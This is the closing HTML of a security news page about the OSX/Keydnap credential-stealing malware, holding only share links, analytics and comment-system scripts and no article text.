											<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2016%2F07%2F06%2Fnew-osxkeydnap-malware-hungry-credentials%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
							<span class="icomoon icon-icon_fb"></span>
						</a>
											<a class="share-twitter" href="https://twitter.com/intent/tweet?https%3A%2F%2Fwww.welivesecurity.com%2F2016%2F07%2F06%2Fnew-osxkeydnap-malware-hungry-credentials%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
							<span class="icomoon icon-icon_tw"></span>
						</a>
											<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2016%2F07%2F06%2Fnew-osxkeydnap-malware-hungry-credentials%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
							<span class="icomoon icon-icon_in"></span>
						</a>
									</div>
			</div>
		</div>
	
	<script>
		var baseUrl = "https://www.welivesecurity.com/";
	</script>
	
			<script>
            !function(){if(-1==window.document.cookie.indexOf("user_rec=1")){function e(e,o){var t=document.createElement("img");t.setAttribute("style","display:none"),t.src=e+o,window.document.body.appendChild(t)}function o(){d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Default%20status&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=defaultStatus&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c)}function t(){console.log("GA and GTM are loaded."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=11",e(u,a),e(s,c)}function n(){var e=new Date;e.setTime(e.getTime()+63072e6);var o="expires="+e.toUTCString();window.document.cookie="user_rec=1; "+o+"; path=/"}var d,a,c,i,r,l="UA-76266002-27",g=window.location.href,s="https://cdn1.esetstatic.com/ESET/INT/assets/img/check.png",u="https://www.google-analytics.com/collect",w="wls",m=0,h=function e(){i=window.ga&&ga.create?1:0,r=window.google_tag_manager?1:0,m++,console.log("Timer: ",m),h=setTimeout(e,500)};window.document.addEventListener&&(d=1e6*Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=Script%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=scriptLoaded&z="+Math.floor(1e6*Math.random(0,1)),e(u,a),e(s,c),window.addEventListener("beforeunload",o),window.ga&&ga.create&&window.google_tag_manager?(t(),window.removeEventListener("beforeunload",o),n()):(setTimeout(h,500),setTimeout(function(){clearTimeout(h),i&&r?t():i&&!r?(console.log("GA is loaded and GTM is blocked."),d=ga.getAll()[0].get("clientId"),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20loaded,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=10",e(u,a),e(s,c)):!i&&r?(console.log("GA is blocked and GTM is loaded."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20loaded&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=01",e(u,a),e(s,c)):i||r||(console.log("GA is blocked and GTM is blocked."),d||Math.random(1e6,9999999),a="?v=1&cid="+d+"&tid="+l+"&dl="+g+"&t=event&ec=Tracking%20check%20-%20recurring&ea=GA%20blocked,%20GTM%20blocked&ni=1&cd1="+w+"&aip=1&z="+Math.floor(1e6*Math.random(0,1)),c="?country=wls&gcode=00",e(u,a),e(s,c)),window.removeEventListener("beforeunload",o),n()},1e4)))}}();
		</script>
	
	<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/js/main-0ba0c3843d.js"></script>
    <!-- Version: v1.1.76.32619db9.pro-awus -->
    		<script type="text/javascript">
			var disqus_config = function () { 
				this.language = "en";
			};
			var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":"", "numsVisible": false};
			var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
		</script>
		<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/static/js/crayon.min.js"></script>

			
		
    <script>
    	Main.init();
    </script>

    <link rel='stylesheet' id='mediaelement-css'  href='https://www.welivesecurity.com/wp-includes/js/mediaelement/mediaelementplayer-legacy.min.css?ver=4.2.6-78496d1' type='text/css' media='all' />
<link rel='stylesheet' id='wp-mediaelement-css'  href='https://www.welivesecurity.com/wp-includes/js/mediaelement/wp-mediaelement.min.css?ver=4.9.8' type='text/css' media='all' />
<script type='text/javascript'>
/* <![CDATA[ */
var countVars = {"disqusShortname":"welivesecurity"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.16'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.16"},"disqusIdentifier":"81256 \/?p=81256","disqusShortname":"welivesecurity","disqusTitle":"New OSX\/Keydnap malware is hungry for credentials","disqusUrl":"https:\/\/www.welivesecurity.com\/2016\/07\/06\/new-osxkeydnap-malware-hungry-credentials\/","postId":"81256"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.16'></script>
    <script src="https://assets.esetstatic.com/3PR/app.min.js"></script>
  </body>
</html>